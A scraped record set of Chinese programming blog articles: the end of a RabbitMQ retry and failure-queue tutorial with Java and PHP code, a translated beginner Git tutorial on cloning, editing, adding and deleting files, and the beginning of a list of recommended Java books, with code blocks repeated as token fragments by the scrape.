不要忘记了应答消费成功消息,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,basic_publish,(,msg,,, ,'master.failed',,, ,routing,-,key,),ack,(,delivery,-,tag,), ,// 不要忘记了应答消费成功消息,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,一定不要忘记ack消息，因为重试、失败都是通过将消息重新投递到重试、失败Exchange来实现的，如果忘记ack，则该消息在超时或者连接断开后，会重新被重新投递给消费者，如果消费者依旧无法处理，则会造成死循环。,\n,Java代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ntry {\r\n    String message = new String(body, \"UTF-8\");\r\n    // 消息处理函数\r\n    handler.handle(message, envelope.getRoutingKey());\r\n\r\n} catch (Exception e) {\r\n    long retryCount = getRetryCount(properties);\r\n    if (retryCount > 3) {\r\n        // 重试次数大于3次，则自动加入到失败队列\r\n        channel.basicPublish(\"master.failed\", envelope.getRoutingKey(), MessageProperties.PERSISTENT_BASIC, body);\r\n    } else {\r\n        // 重试次数小于3，则加入到重试队列，30s后再重试\r\n        channel.basicPublish(\"master.retry\", envelope.getRoutingKey(), properties, body);\r\n    }\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,try, ,{,    ,String, ,message, ,=, ,new, ,String,(,body,,, ,\"UTF-8\",),;,    ,// 消息处理函数,    ,handler,.,handle,(,message,,, ,envelope,.,getRoutingKey,(,),),;, ,}, ,catch, ,(,Exception, ,e,), ,{,    ,long, ,retryCount, ,=, ,getRetryCount,(,properties,),;,    ,if, ,(,retryCount, ,>, ,3,), ,{,        ,// 重试次数大于3次，则自动加入到失败队列,        ,channel,.,basicPublish,(,\"master.failed\",,, ,envelope,.,getRoutingKey,(,),,, ,MessageProperties,.,PERSISTENT_BASIC,,, ,body,),;,    ,}, ,else, ,{,        ,// 重试次数小于3，则加入到重试队列，30s后再重试,        ,channel,.,basicPublish,(,\"master.retry\",,, ,envelope,.,getRoutingKey,(,),,, ,properties,,, ,body,),;,    ,},},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,失败任务重试,\n,如果任务重试三次仍未成功，则会被投递到失败队列，这时候需要人工处理程序异常，处理完毕后，需要将消息重新投递到队列进行处理，这里唯一需要做的就是从失败队列订阅消息，然后获取到消息后，清空其,application_headers,头信息，然后重新投递到,master,这个Exchange即可。,\n,Java代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nchannel.basicPublish(\r\n    'master', \r\n    envelope.getRoutingKey(),\r\n    MessageProperties.PERSISTENT_BASIC,\r\n    body\r\n);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,channel,.,basicPublish,(,    ,'master',,, ,    ,envelope,.,getRoutingKey,(,),,,    ,MessageProperties,.,PERSISTENT_BASIC,,,    ,body,),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,PHP代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$msg->set('application_headers', new AMQPTable([]));\r\n$this->channel->basic_publish(\r\n    $msg,\r\n    'master',\r\n    $msg->get('routing_key')\r\n);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$,msg,->,set,(,'application_headers',,, ,new, ,AMQPTable,(,[,],),),;,$,this,->,channel,->,basic_publish,(,    ,$,msg,,,    ,'master',,,    ,$,msg,->,get,(,'routing_key',),),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,怎么使用,\n,队列和Exchange以及发布订阅的关系我们就说完了，那么使用起来是什么效果呢？这里我们以Java代码为例,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n// 发布消息\r\nPublisher publisher = new Publisher(factory.newConnection(), 'master');\r\npublisher.publish(\"{\\\"id\\\":121, \\\"name\\\":\\\"guanyiyao\\\"}\", \"user.create\");\r\n\r\n// 订阅消息\r\nnew Subscriber(factory.newConnection(), Main.EXCHANGE_NAME)\r\n    .init(\"user-monitor\", \"user.*\")\r\n    .subscribe((message, routingKey) -> {\r\n        // TODO 业务逻辑\r\n        System.out.printf(\"     message consumed: %s\\n\", routingKey, message);\r\n    }\r\n);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,// 发布消息,Publisher ,publisher, ,=, ,new, ,Publisher,(,factory,.,newConnection,(,),,, ,'master',),;,publisher,.,publish,(,\"{\\\"id\\\":121, \\\"name\\\":\\\"guanyiyao\\\"}\",,, ,\"user.create\",),;, ,// 订阅消息,new, ,Subscriber,(,factory,.,newConnection,(,),,, ,Main,.,EXCHANGE_NAME,),    ,.,init,(,\"user-monitor\",,, ,\"user.*\",),    ,.,subscribe,(,(,message,,, ,routingKey,), ,->, ,{,        ,// TODO 业务逻辑,        ,System,.,out,.,printf,(,\"     message consumed: %s\\n\",,, ,routingKey,,, ,message,),;,    ,},),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,总结,\n,使用RabbitMQ时，实现延时重试和失败队列的方式并不仅仅局限于本文中描述的方法，如果读者有更好的实现方案，欢迎拍砖，在这里我也只是抛砖引玉了。本文中讲述的方法还有很多优化空间，读者也可以试着去改进其实现方案，比如本文中使用了三个Exchagne，是否只使用一个Exchange也能实现本文中所讲述的功能。,\n\r\n        \r\n            ,\n        ,打赏支持我写出更多好文章，谢谢！,\n        , 打赏作者,\n    ,\n\n    ,\n        ,打赏支持我写出更多好文章，谢谢！,\n                ,任选一种支付方式,\n                ,\n                        ,\n            \n                            ,\n                    ,\n    ,\n\n    \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,管宜尧,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            PHP程序猿，常用网络ID为mylxsw，具有6年以上PHP研发经验，专注于PHP，Golang以及Linux生态、微服务架构等方向，对技术比较执着，经常会写一些博文分享自己的所学，目前就职于重庆允升科技有限公司。        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 11, · , , ,         ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113984/", "url_object_id": "a1c4868d9e1eb29137006234c75e2c5e", "front_image_path": "full/a4ef892dcc22d6d944ae2c4ec2d3472908ff01eb.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/a9f8e32251fe9ed8030a42ac78ef2343.jpg"], "title": "在 Git 中怎样克隆、修改、添加和删除文件？", "create_time": "2018/06/09", "vote": "1", "bookmark": "2", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Kedar Vijay Kulkarni,   译文出处：,Linux中国/MjSeven,   ,\n,在 ,本系列的第一篇文章, 开始使用 Git 时，我们创建了一个简单的 Git 仓库，并用我们的计算机连接到它，向其中添加一个文件。在本文中，我们将学习一些关于 Git 的其他内容，即如何克隆（下载）、修改、添加和删除 Git 仓库中的文件。,\n,让我们来克隆一下,\n,假设你在 GitHub 上已经有一个 Git 仓库，并且想从它那里获取你的文件——也许你在你的计算机上丢失了本地副本，或者你正在另一台计算机上工作，但是想访问仓库中的文件，你该怎么办？从 GitHub 下载你的文件？没错！在 Git 术语中我们称之为“克隆clone”。（你也可以将仓库作为 ZIP 文件下载，但我们将在本文中探讨克隆方式。）,\n,让我们克隆在上一篇文章中创建的名为 Demo 的仓库。（如果你还没有创建 Demo 仓库，请跳回到,那篇文章,并在继续之前执行那些步骤）要克隆文件，只需打开浏览器并导航到 ,https://github.com/<your_username>/Demo, (其中 <your_username> , 是你仓库的名称。例如，我的仓库是 ,https://github.com/kedark3/Demo,)。一旦你导航到该 URL，点击“克隆或下载Clone or download”按钮，你的浏览器看起来应该是这样的：,\n,\n,正如你在上面看到的，“使用 HTTPS 克隆Clone with HTTPS”选项已打开。从该下拉框中复制你的仓库地址（,https://github.com/<your_username>/Demo.git,），打开终端并输入以下命令将 GitHub 仓库克隆到你的计算机：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit clone https://github.com/<your_username>/Demo.git\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,clone, ,https,:,//github.com/<your_username>/Demo.git, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,然后，要查看 ,Demo, 目录中的文件列表，请输入以下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nls Demo/\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,ls ,Demo,/, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,终端看起来应该是这样的：,\n,\n,修改文件,\n,现在我们已经克隆了仓库，让我们修改文件并在 GitHub 上更新它们。首先，逐个输入下面的命令，将目录更改为 ,Demo/,，检查 ,README.md, 中的内容，添加新的（附加的）内容到 ,README.md,，然后使用 ,git status, 检查状态:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ncd Demo/\r\nls\r\ncat README.md\r\necho \"Added another line to REAMD.md\" >> README.md\r\ncat README.md\r\ngit status\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,cd ,Demo,/,ls,cat ,README,.,md,echo, ,\"Added another line to REAMD.md\", ,>>, ,README,.,md,cat ,README,.,md,git ,status, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果你逐一运行这些命令，终端看起开将会是这样：,\n,\n,让我们看一下 ,git status, 的输出，并了解它的意思。不要担心这样的语句：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nOn branch master\r\nYour branch is up-to-date with 'origin/master'.\".\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,On ,branch ,master,Your ,branch ,is, ,up,-,to,-,date ,with, ,'origin/master',.,\",., ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,因为我们还没有学习这些。（LCTT 译注：学了你就知道了）下一行说：,Changes not staged for commit,（变化未筹划提交）；这是告诉你，它下面列出的文件没有被标记准备（“筹划stage”）提交。如果你运行 ,git add,，Git 会把这些文件标记为 ,Ready for commit,（准备提交）；换句话说就是 ,Changes staged for commit,（变化筹划提交）。在我们这样做之前，让我们用 ,git diff, 命令来检查我们添加了什么到 Git 中，然后运行 ,git add,。,\n,这里是终端输出：,\n,\n,我们来分析一下：,\n,\n,diff --git a/README.md b/README.md, 是 Git 比较的内容（在这个例子中是 ,README.md,）。,\n,--- a/README.md, 会显示从文件中删除的任何东西。,\n,+++ b/README.md, 会显示从文件中添加的任何东西。,\n,任何添加到文件中的内容都以绿色文本打印，并在该行的开头加上 ,+, 号。,\n,如果我们删除了任何内容，它将以红色文本打印，并在该行的开头加上 ,-, 号。,\n,现在 ,git status, 显示 ,Changes to be committed:,（变化将被提交），并列出文件名（即 ,README.md,）以及该文件发生了什么（即它已经被 ,modified, 并准备提交）。,\n,\n,提示：如果你已经运行了 ,git add,，现在你想看看文件有什么不同，通常 ,git diff, 不会输出任何东西，因为你已经添加了文件。相反，你必须使用 ,git diff --cached,。它会告诉你 Git 添加的当前版本和以前版本文件之间的差别。你的终端输出看起来会是这样：,\n,\n,上传文件到你的仓库,\n,我们用一些新内容修改了 ,README.md, 文件，现在是时候将它上传到 GitHub。,\n,让我们提交更改并将其推送到 GitHub。运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit commit -m \"Updated Readme file\"\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,commit, ,-,m, ,\"Updated Readme file\", ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这告诉 Git 你正在“提交”已经“添加”的更改，你可能还记得，从本系列的第一部分中，添加一条消息来解释你在提交中所做的操作是非常重要的，以便你在稍后回顾 Git 日志时了解当时的目的。（我们将在下一篇文章中更多地关注这个话题。）,Updated Readme file, 是这个提交的消息——如果你认为这没有合理解释你所做的事情，那么请根据需要写下你的提交消息。,\n,运行 ,git push -u origin master,，这会提示你输入用户名和密码，然后将文件上传到你的 GitHub 仓库。刷新你的 GitHub 页面，你应该会看到刚刚对 ,README.md, 所做的更改。,\n,\n,终端的右下角显示我提交了更改，检查了 Git 状态，并将更改推送到了 GitHub。,git status, 显示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nYour branch is ahead of 'origin/master' by 1 commit\r\n  (use \"git push\" to publish your local commits)\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,Your ,branch ,is, ,ahead ,of, ,'origin/master', ,by, ,1, ,commit, , ,(,use, ,\"git push\", ,to, ,publish ,your ,local ,commits,), ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,第一行表示在本地仓库中有一个提交，但不在 ,origin/master, 中（即在 GitHub 上）。下一行指示我们将这些更改推送到 ,origin/master, 中，这就是我们所做的。（在本例中，请参阅本系列的第一篇文章，以唤醒你对 ,origin, 含义的记忆。我将在下一篇文章中讨论分支的时候，解释 ,master, 的含义。）,\n,添加新文件到 Git,\n,现在我们修改了一个文件并在 GitHub 上更新了它，让我们创建一个新文件，将它添加到 Git，然后将其上传到 GitHub。 运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\necho \"This is a new file\" >> file.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,echo, ,\"This is a new file\", ,>>, ,file,.,txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这将会创建一个名为 ,file.txt, 的新文件。,\n,如果使用 ,cat, 查看它：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ncat file.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,cat ,file,.,txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你将看到文件的内容。现在继续运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit status\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,status, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,Git 报告说你的仓库中有一个未跟踪的文件（名为 ,file.txt,）。这是 Git 告诉你说在你的计算机中的仓库目录下有一个新文件，然而你并没有告诉 Git，Git 也没有跟踪你所做的任何修改。,\n,\n,我们需要告诉 Git 跟踪这个文件，以便我们可以提交并上传文件到我们的仓库。以下是执行该操作的命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit add file.txt\r\ngit status\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,add ,file,.,txt,git ,status, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,终端输出如下：,\n,\n,git status, 告诉你有 ,file.txt, 被修改，对于 Git 来说它是一个 ,new file,，Git 在此之前并不知道。现在我们已经为 Git 添加了 ,file.txt,，我们可以提交更改并将其推送到 ,origin/master,。,\n,\n,Git 现在已经将这个新文件上传到 GitHub；如果刷新 GitHub 页面，则应该在 GitHub 上的仓库中看到新文件 ,file.txt,。,\n,\n,通过这些步骤，你可以创建尽可能多的文件，将它们添加到 Git 中，然后提交并将它们推送到 GitHub。,\n,从 Git 中删除文件,\n,如果我们发现我们犯了一个错误，并且需要从我们的仓库中删除 ,file.txt,，该怎么办？一种方法是使用以下命令从本地副本中删除文件：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nrm file.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,rm ,file,.,txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果你现在做 ,git status,，Git 就会说有一个文件 ,not staged for commit,（未筹划提交），并且它已经从仓库的本地拷贝中删除了。如果我们现在运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit add file.txt\r\ngit status\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,add ,file,.,txt,git ,status, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我知道我们正在删除这个文件，但是我们仍然运行 ,git add,，因为我们需要告诉 Git 我们正在做的,更改,，,git add, 可以用于我们添加新文件、修改一个已存在文件的内容、或者从仓库中删除文件时。实际上，,git add, 将所有更改考虑在内，并将这些筹划提交这些更改。如果有疑问，请仔细查看下面终端屏幕截图中每个命令的输出。,\n,Git 会告诉我们已删除的文件正在进行提交。只要你提交此更改并将其推送到 GitHub，该文件也将从 GitHub 的仓库中删除。运行以下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit commit -m \"Delete file.txt\"\r\ngit push -u origin master\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,commit, ,-,m, ,\"Delete file.txt\",git ,push, ,-,u, ,origin ,master, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在你的终端看起来像这样：,\n,\n,你的 GitHub 看起来像这样：,\n,\n,现在你知道如何从你的仓库克隆、添加、修改和删除 Git 文件。本系列的下一篇文章将检查 Git 分支。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114104/", "url_object_id": "2fd3e1a536854e3343b73dcb02097713", "front_image_path": "full/02da8890d313b46cdbac49de0b7a5f2041adce48.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/03/stack-of-books2.jpg"], "title": "2018 年 Java 程序员必读的十本书", "create_time": "2018/06/17", "vote": "2", "bookmark": "7", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文由 ,伯乐在线, - ,yizhe, 翻译，,艾凌风, 校稿。未经许可，禁止转载！,英文出处：,Javin Paul ,。欢迎加入,翻译组,。,大家好，如果你是一名 Java 程序员，正在考虑 2018 年读什么书，那么这篇文章正适合你。本文中，我将分享 10 本有关 Java、Spring 及其他相关技术的书籍。 这里面既有适合经验丰富的 Java 程序员的书，它们介绍了架构、云开发、微服务、Java 9、Spring 5，以及用于提高生产效率的 Kotlin。同时也照顾到了初级的、缺乏经验的、或正打算 2018 年开始入门 Java 的新手。,\n,同时，我也介绍了一些在 2018 年学习 Java 9 的书籍。有些已经针对 Java SE 9 全面更新，比如 《写给大忙人看的Java SE 9》和 《Java 9 编程入门官方教程》。,\n,如果你刚开始学习 Java 或者正打算要学，这些书都非常适合。不推荐读旧版本的书来入门，除非是《Head First Java》。,\n,我特别希望《Head First Java》的第三版是一个长期的版本，作者和出版方最好针对 Java 8 和 Java 9 进行全面更新。不过对于入门 Java 的编程小白来说，旧版本的《Head First Java》仍然是一本好书。,\n,我最近添加到这个书单的就是这本今天刚发现的《云原生 Java》。这本书看起来特别棒，它介绍了目前急需的，利用 Spring Boot、Spring Cloud 和 Cloud Foundry 在云上开发 Java 应用的知识。虽然还没读完，但它看起来特别棒。,\n,2018 年可以用来提升 Java 知识技能的书太多了，你不可能把他们都读完。不过有些书你绝对不想错过，比如《Effective Java（第三版）》，我把它放在了书单的最上面。,\n,书单里的书介绍了 Java 9、Spring 5、Kotlin、软件架构、微服务、云以及 Java 8 的一些特性。,\n,这个书单不是很长，但里面的书都很棒，都挺适合在上下班路上读。,\n,1. 《Effective Java（第三版）》（Effective Java 3rd Edition）,\n,如果你还没读过这本书，那它绝对是 2018 年你必须读的第一本书。第三版是一个长期版本，其实它早就该出版了。这版书也囊括了 JDK 7、8、9 的新特性。,\n,我在 1 月份的第一个星期就拿到了这本书，它绝对是约书亚·布洛克（Joshua Bloch）给 Java 程序员最好的新年礼物。,\n,我花了大概一个星期就读完了这本书。我发现读的过程中，时常碰到新的知识点，特别是关于 Java 8 和 Java 9 的。,\n,我从这本书中学到了 Java 的模块化，它也帮我理顺了之前对于 Java 8 的一些误解。,\n,\n,2. 《现代 Java 开发范例》（Modern Java Recipes）,\n,如果你喜欢范例类型的书，那这本书就很不错。就像简介里提到的，这本书提供了解决 Java 8 和 Java 9 中一些难题的简单方案。,\n,你会学到如何使用 Java 8 的 lambda 表达式、方法引用以及 Stream API 写代码。,\n,如果你想通过手册和范例来学习 Java 8 和 Java 9 ，这本书就很完美。,\n,\n,3. 《Java 9 模块化》（Java 9 Modularity）,\n,Java 9 的一个亮点就是 Java 的模块化，本书对这部分做了最全面的介绍。,\n,作者桑德斯·马克（Sanders Mak）是 Java 9 模块化的权威。我听过很多他讲 Java 9 的课程，比如在 Pluarlsight 做的《Java 9 模块化及新特性》。我可以保证，读完此书之后，你绝不会后悔。,\n,\n,4. 《写给大忙人看的Java SE 9（第二版）》 （Core Java SE 9 for the Impatient (2nd Edition)）,\n,如果你急着学 Java 那我推荐这本书给你。我是凯 S·霍斯特曼 (Cay S. Horstmann)的一个忠实粉丝，他的文采之优美、涉猎之广，都让我很是佩服。,\n,你读了他写的关于 Java 8、Scala 的书以及《Java 核心编程》之后，绝对也会成为他的粉丝。,\n,这本书已经针对 Java SE 9 全面更新。如果你想学习 Java 9，那2018年你应该先读读这本书。,\n,\n, ,\n,5. 《Java 8入门》（Beginning Java 8 Language Features）,\n,尽管已经发布快 4 年了，仍然有很多 Java 程序员还没有开始使用 Java 8。,\n,如果你是这些人的一员，或者还不是很理解 lambda 表达式、Stream API、Optional 及 Java 8 其他的特性，那你一定要读这本书。,\n,这是一个系列，共有3卷，此卷通俗易懂的讲解了 Java 8 的基础知识。,\n,另外两卷则延伸到 Java 8 的高级特性，比如 JDBC、Swing、 Java FX，以及 Java 网络 API。,\n,\n,6. 《Spring 微服务实战》（Spring Microservices in Action）,\n,软件开发世界正在加速转向微服务架构，它在开发、维护、部署、扩容性及可靠性等方面有很多优势。,\n,感谢 Spring framework 提供这么多开发微服务的 Java 工具，比如 Spring Boot 和 Spring Cloud。,\n,如果你对用 Spring framework 开发微服务有兴趣，那么这本书很适合你。,\n,\n,7. 《架构整洁之道》（Clean Architecture）,\n,我是在2017年读的这本书，特别喜欢。我是罗伯特 C·马丁（Robert C. Martin）的一个忠实粉丝（大家称之为“ Bob 大叔”）。加上之前的《代码整洁之道（Clean Code）》和《代码整洁之道 程序员的职业素养（Clean Coder book）》，这本书完成了代码整洁之道三部曲。,\n,它介绍了如何构建可以经受时间考验的软件架构，还消除了对设计模式和软件架构的一些误解。,\n,如果你是一名经验丰富的 Java 程序员，正想转变为一个方案设计师，那这本书2018年你一定要读完。,\n,\n,8. 《Spring 5 开发范例代码大全》（Spring 5 Recipes: A Problem-Solution Approach）,\n,抛开 JDK 9 不谈，2017年另外一个大的版本更新就是 Spring 5 ，它将响应式编程引入了 Spring 。,\n,既然对 Java 程序员来说， Spring 是无可争议的、最流行的架构，那么学习 Spring 5 让自己紧跟技术潮流，是非常值得的。,\n,我个人非常喜欢目标导向的范例类图书，这也是我为什么选择了这本书用来学习 Spring 5。,\n,它不仅覆盖了 Spring 5 的新特性，也讲了其他早期版本的增强。一句话，它教你如何在 Spring 5 的环境下写代码。,\n,\n, ,\n,9. 《Kotlin 实战》（Kotlin in Action）,\n,Java 程序员通过学习 Scala、Groovy、Closure 等 JVM 语言来成为一名多语言的开发者是很常见的。而 Kotlin 正是当下的热门。,\n,自从 2017 年 Google 在 Google IO 上宣布将 Kotlin 作为 Android 的官方语言之后，很多人都开始对学习 Kotlin 感兴趣。,\n,更重要的是，它能提高你的生产效率，而且它和 Java 非常相似。因此，如果你想在 2018 年学习一种 JVM 语言，我建议学习 Kotlin。,\n,\n,10. 《Java 9 编程入门官方教程(第七版)》（Java: A Beginner’s Guide, Seventh Edition）,\n,这是另一本从零开始学习 Java 的经典书籍。第七版已经针对 Java SE 9 全面更新。,\n,如果你想在 2018 年开始你的 Java 程序员生涯，这本书可以帮你学到最新版本的 Java。,\n,这本书比书单里的第二本更全面。,\n,\n, ,\n,11. 《云原生 Java》（Cloud Native Java）,\n,恭喜读到这里的朋友，你们收获了一个彩蛋 ——《云原生 Java》，2018 年最有用的 Java 书籍。,\n,当今的软件开发，大都是关于云、微服务、分布式架构等等。乔氏·隆（Josh Long）和肯尼·巴斯塔尼（Kenny Bastani）在这本书里向 Java/JVM 开发者展示了如何使用 Spring Boot、Spring Cloud 和 Cloud Foundry 构建更好、更快的 Java 应用程序。,\n,对于经验丰富的 Java 开发者来说，它绝对是一本必读书。尽管它介绍了相对高级的内容，我还是强烈推荐每一位 Java 程序员都读一下。,\n,实际上，我还没有读完这本书。但是读完前言之后，我就对所讨论的话题非常感兴趣。我可能在读完之后再写一篇详细的文章。但它绝对值得各位至少读一遍。,\n,\n,这就是 2018 年 Java 程序员可以读的一些有趣、有用的书籍。实话实说，即使是让自己紧跟 Java 世界的技术潮流，比如 Java 9、Sprig 5、微服务、Kotlin 